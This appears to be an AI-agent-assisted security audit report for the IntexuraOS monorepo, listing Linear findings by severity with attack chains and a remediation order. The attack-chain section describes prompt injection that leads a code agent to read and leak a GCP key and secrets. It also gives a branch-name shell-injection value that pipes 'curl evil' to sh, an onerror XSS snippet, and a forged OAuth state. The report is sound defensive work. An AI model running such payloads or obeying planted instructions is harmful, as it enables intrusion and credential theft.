# IntexuraOS Security Audit — 2026-04-24

Tracking issue: [INT-1472](https://linear.app/pbuchman/issue/INT-1472)

## Methodology

A senior-security-engineer audit was run on the IntexuraOS monorepo. Ten focused audit agents ran in parallel, each covering one risk domain:

1. Authentication, JWT plumbing, internal auth, route-level authorization
2. Secrets, configuration, logging & data leakage
3. Code-agent / code-worker sandboxing & container isolation
4. Web app security (XSS, CSRF, tokens, CSP)
5. Firestore data layer, multi-tenant isolation, IDOR
6. LLM agents — prompt injection, SSRF, output handling
7. Webhook & Pub/Sub authentication (WhatsApp, Linear, GitHub, Gmail)
8. OAuth flows & third-party integrations (Google, GitHub, Firebase)
9. Infrastructure — Terraform, Cloud Run, IAM, Secret Manager, WIF
10. Input validation, rate-limiting, DoS, dependencies, misc hardening

Findings were deduplicated across agents and grouped by type. Each distinct finding type was filed as a separate Linear issue under the tracking issue INT-1472.

## Findings index (child issues of INT-1472)

### Critical
| Linear   | Title                                                                       |
| -------- | --------------------------------------------------------------------------- |
| INT-1474 | Cloud Run services public by default (`allow_unauthenticated=true`)         |
| INT-1475 | Shared-secret `X-Internal-Auth` model; replace with per-caller OIDC         |
| INT-1476 | Pub/Sub push routes accept forgeable `From: noreply@google.com` header      |
| INT-1477 | Scheduler auth accepts any `Authorization: Bearer ...` without verification |
| INT-1478 | IDOR — internal and user routes trust client-supplied `userId`              |
| INT-1479 | SSRF in outbound URL fetchers (image proxy, link preview, page summarizer)  |
| INT-1480 | Code-worker LLM runs with `--dangerously-skip-permissions`                  |
| INT-1481 | Code-worker container ships GCP SA key and full secret bundle to LLM        |
| INT-1482 | Code-worker bind-mounts main `.git` directory read-write (hook → host RCE)  |
| INT-1483 | Shell injection in orchestrator via unvalidated git branch/file names       |
| INT-1484 | OAuth `state` parameter is unsigned and spoofable (full ATO)                |
| INT-1485 | GitHub OAuth requests over-broad `repo` scope                               |
| INT-1487 | CORS `origin: true` reflects arbitrary origins on every Fastify service     |
| INT-1488 | Missing `firestore.rules` — DB layer fails open                             |
| INT-1489 | Weak PRNG (`Math.random`) for public research share token                   |
| INT-1490 | No rate limiting anywhere (LLM endpoints, auth, webhooks)                   |
| INT-1493 | Prompt injection in agents (cron, page-summarizer, chat, hellscript)        |
| INT-1501 | Over-privileged service accounts                                            |
| INT-1503 | Auth0 access tokens stored in `localStorage` (XSS → token theft)            |

### High
| Linear   | Title                                                                           |
| -------- | ------------------------------------------------------------------------------- |
| INT-1486 | `E2E_MODE=true` env var disables JWT auth without production guard              |
| INT-1491 | Stored XSS via `rehypeRaw` without sanitization in web app                      |
| INT-1492 | Stored XSS in shared research HTML pages (`marked` without DOMPurify)           |
| INT-1494 | Non-timing-safe comparison for internal auth / webhook verify tokens            |
| INT-1495 | Webhook HMAC verified against re-serialized body, not raw bytes                 |
| INT-1496 | No webhook replay / idempotency / timestamp freshness protection                |
| INT-1497 | OAuth redirect URI derived from untrusted `X-Forwarded-Host`/`Host`             |
| INT-1498 | OAuth token encryption key falls back to hard-coded dev constant                |
| INT-1499 | Firebase custom token minted from any Auth0 JWT `sub`                           |
| INT-1500 | All app Dockerfiles run container as root (no `USER` directive)                 |
| INT-1502 | Workload Identity Federation not branch-restricted                              |
| INT-1504 | Missing web security headers — no CSP / HSTS / Helmet                           |
| INT-1505 | `javascript:` URI not blocked in user-supplied bookmark hrefs                   |
| INT-1506 | Shared Claude/Codex credentials mounted read-write across workers               |
| INT-1507 | No request body size limit / no max schema constraints on LLM routes            |
| INT-1509 | Firestore repository layer allows cross-tenant reads (findById without userId)  |
| INT-1511 | GCS buckets with user-generated content are world-readable                      |
| INT-1514 | `pubsub-ui` debug tool logs full `INTEXURAOS_INTERNAL_AUTH_TOKEN`               |
| INT-1515 | Code-worker container has no enforced network egress restrictions               |
| INT-1520 | Guest chat rate-limit trivially bypassed via attacker-controlled session header |
| INT-1521 | LLM API keys passed as process env to code-worker                               |
| INT-1522 | `cloud_functions_source` GCS bucket: `force_destroy=true`, no versioning        |
| INT-1526 | Orchestrator task dispatch uses single static HMAC shared secret                |

### Medium
| Linear   | Title                                                                  |
| -------- | ---------------------------------------------------------------------- |
| INT-1508 | No Pino log redaction; risk of token/Authorization header leakage      |
| INT-1510 | Terraform state bucket lacks CMEK / versioning                         |
| INT-1512 | No HTTP fetch timeouts (Notion, image-gen, usage sinks)                |
| INT-1513 | Notion webhook endpoint has no signature verification                  |
| INT-1516 | Container supply chain — unpinned apt/apk and `curl                    | bash` installers |
| INT-1517 | Container has `NET_RAW` by default; forensics mode grants `SYS_PTRACE` |
| INT-1518 | Firestore PITR disabled; Firebase Identity Platform hardening missing  |
| INT-1519 | `tryAuth` silently falls through to guest on invalid/expired tokens    |
| INT-1523 | Cloud Run deploys use mutable `:latest` image tag                      |
| INT-1524 | `/repo/node_modules` tmpfs has `exec` permission                       |
| INT-1525 | OAuth `state` value logged at INFO level                               |
| INT-1527 | PKCE not implemented on OAuth flows (Google, GitHub)                   |

### Low
| Linear   | Title                                                                 |
| -------- | --------------------------------------------------------------------- |
| INT-1528 | `api-docs-hub` serves aggregated OpenAPI specs without authentication |

## Top attack chains

1. **Prompt injection → full GCP / fleet compromise.** An attacker plants instructions in a Linear issue, PR comment, or repo file the code-agent reads. The LLM runs with `--dangerously-skip-permissions` (INT-1480), shells out to `cat /secrets/gcp-sa.json` and `env`, exfiltrating the GCP service-account JSON (INT-1481) and every `INTEXURAOS_*` secret synced into `.envrc`. Using `INTEXURAOS_INTERNAL_AUTH_TOKEN`, the attacker then pivots to every service's `/internal/*` routes (INT-1475), extracts decrypted user LLM keys and OAuth tokens (INT-1478), and can dispatch code-worker jobs as any user.

2. **Prompt injection → orchestrator host RCE.** The LLM writes `.git/hooks/post-checkout` (writable via INT-1482). The orchestrator's next `git worktree` call executes the hook on the host. Alternatively, the LLM creates a branch name like `"; curl evil | sh; echo "` and waits for the PR-check poller to run `exec()` on it (INT-1483). Container escape without needing any kernel bug.

3. **Internet-origin auth bypass → impersonation.** Because every Cloud Run service is public (INT-1474), an attacker sends `From: noreply@google.com` (INT-1476) or `Authorization: Bearer x.y.z` (INT-1477) to any `/internal/*` endpoint. The handler processes the request as trusted; WhatsApp messages, Firestore writes, LLM billing, GCS deletions all executable without credentials.

4. **Stored XSS → SPA session takeover.** An attacker comments on a tracked GitHub PR with `<img src=x onerror=...>` (INT-1491). `MarkdownContent` with `allowHtml` + `rehypeRaw` renders it. The payload runs in the `intexuraos.cloud` origin, reads the Auth0 token from `localStorage` (INT-1503), and — because CORS is `origin:true` (INT-1487) and there is no CSP (INT-1504) — calls every backend API with the victim's privileges.

5. **OAuth state forgery → victim's Google/GitHub tokens.** Attacker forges `state = base64(JSON({userId:"victim",...}))` (INT-1484), completes an OAuth flow with their own account, and hits the callback. Server writes attacker tokens under the victim's record; `/internal/users/victim/oauth/google/token` now returns attacker tokens (and thanks to INT-1485, those GitHub tokens have full `repo` scope).

## Priority remediation order

1. Code-worker sandboxing (INT-1480, INT-1481, INT-1482, INT-1483, INT-1506, INT-1515, INT-1521) — immediate blast-radius reducers.
2. Public Cloud Run + Pub/Sub auth (INT-1474, INT-1476, INT-1477) — remove unauth fast path.
3. IDOR & OAuth ATO (INT-1478, INT-1484, INT-1485, INT-1499) — identity integrity.
4. SSRF (INT-1479) — prevent metadata / SA-key exfil.
5. CORS + XSS + Auth token storage (INT-1487, INT-1491, INT-1492, INT-1503, INT-1504, INT-1505).
6. Firestore rules + tenant repo scoping (INT-1488, INT-1509).
7. Infra IAM & Terraform (INT-1501, INT-1502, INT-1500, INT-1510, INT-1511, INT-1522).
8. Rate limiting, body limits, timeouts (INT-1490, INT-1507, INT-1512, INT-1520).
9. Everything else (timing-safe comparisons, HMAC over raw body, log redaction, etc.).

## Notes

- Assignment of Linear issues was intentionally left to the user per CLAUDE.md Linear MCP Safety rule.
- This document is the evidence artifact for the audit task INT-1472. No source code was changed; all actionable work is filed as Linear child issues.
